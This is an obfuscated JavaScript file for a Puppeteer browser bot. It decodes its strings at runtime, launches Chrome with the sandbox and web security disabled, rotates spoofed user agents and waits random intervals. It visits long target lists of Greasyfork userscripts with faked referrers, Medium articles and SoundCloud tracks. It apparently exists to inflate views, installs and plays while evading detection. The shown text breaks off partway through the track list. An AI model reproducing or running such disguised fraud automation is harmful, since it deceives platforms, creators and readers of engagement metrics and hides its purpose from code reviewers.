function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1 * 0x24cb + -0x8 * -0x407 + 0x3 * -0x1701);
    let h = e[f];
    return h;
  }, d(b, c);
}
const a1 = b,
  a0 = d,
  Z = c;

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1 * 0x24cb + -0x8 * -0x407 + 0x3 * -0x1701);
    let h = e[f];
    if (b['bZXUMG'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1 * 0xf4d + 0x139d + 0x170 * -0x3, s, t, u = 0x119b * 0x1 + -0x1 * 0xdeb + -0x3b0; t = n['charAt'](u++); ~t && (s = r % (-0x21d * 0xa + -0x1a4f + 0x2f75) ? s * (-0xf0 * -0x24 + -0x83 * -0x2 + -0x2286) + t : t, r++ % (0x8 * 0x106 + -0x239f + 0x1b73)) ? p += String['fromCharCode'](-0x1f3d * 0x1 + -0x1 * -0x2647 + -0x60b & s >> (-(0x2 * -0xa7e + 0x1cc6 + 0x53 * -0x18) * r & 0x71b + 0x650 + -0x1b * 0x7f)) : -0x1b13 + 0x1 * 0x1369 + -0x28e * -0x3) {
          t = o['indexOf'](t);
        }
        for (let v = -0x4e3 + 0x84 + -0x45f * -0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x5ad + -0x16f * 0x8 + 0x1135))['slice'](-(-0x3a * -0x52 + -0x2f * 0x19 + -0xdfb));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x2 * 0x245 + -0x1 * 0x2d7 + 0x761,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0xd * -0x11b + 0x8ba + 0x51 * -0x49; u < -0x182 * 0x18 + 0xd35 + 0x17fb; u++) {
          p[u] = u;
        }
        for (u = -0x19ae + 0x50c + 0x14a2; u < 0x2 * 0xc25 + -0x1c43 + 0x43 * 0x13; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x39 * 0x9e + 0x76 * 0x4 + -0x125 * -0x1e), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x212d + -0x2 * 0x29f + 0x266b, q = -0xb * 0x175 + 0x2 * -0xdf1 + 0x2be9;
        for (let v = -0x2266 * 0x1 + 0x2 * -0x2ea + 0x283a; v < n['length']; v++) {
          u = (u + (-0xd4 * 0x2e + -0x107a + 0x3693)) % (-0xb * 0x367 + -0x1 * -0x12a3 + 0x2 * 0x9e5), q = (q + p[u]) % (-0x1468 + -0x2f * 0x3 + 0x15f5), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1b2 + 0x1ca7 * 0x1 + -0x1 * 0x1d59)]);
        }
        return t;
      };
      b['QFUYvf'] = m, c = arguments, b['bZXUMG'] = !![];
    }
    const j = e[-0x5ef * 0x1 + 0x22a8 + -0x1cb9],
      k = f + j,
      l = c[k];
    return !l ? (b['PMZPfM'] === undefined && (b['PMZPfM'] = !![]), h = b['QFUYvf'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function getRandomInt(f, g) {
  const h = ceil(f);
  return floor(random() * (floor(g) - h + (0x1cf1 + 0x14cd + -0x31bd))) + h;
}
async function randomWait() {
  return await wait(-0x1a4f + 0x31d + 0x2aba + (-0xf0 * -0x24 + -0x83 * -0x2 + -0xf3e) * random()), 0x8 * 0x106 + -0x239f + 0x1b70;
}
const flags = {
    'ActivateBrowser': 0x1,
    'RPL2_GF': 0x1,
    'RPL2_SC2': 0x1,
    'RPL2_MDM2': 0x1,
    'RPL2_WP': 0x0,
    'RPL2_RPRT': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math,
  NETWORK_PATIENCE = -0x4af9 * 0x1 + -0x1 * -0x5bdc + 0x1dfd + (0x2 * -0xa7e + 0x1cc6 + 0x1f7 * 0x2) * random(),
  MM_NETWORK_PATIENCE = (0x71b + 0x650 + -0x34 * 0x42) * NETWORK_PATIENCE,
  me = random()['toString'](-0x1b13 + 0x1 * 0x1369 + -0x3dd * -0x2)['substring'](-0x4e3 + 0x84 + -0x463 * -0x1, -0x5ad + -0x16f * 0x8 + 0x112f),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x7) + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + a0(0x2) + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + a0(0x2) + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + Z(0x9) + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0x8)
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + a0(0x6) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + a1(0x4, 'FS!t') + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + Z(0xb),
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + 'undcloud.c' + 'om/22down/' + a1(0x1, ')9OQ') + Z(0xc) + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + a0(0x10) + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
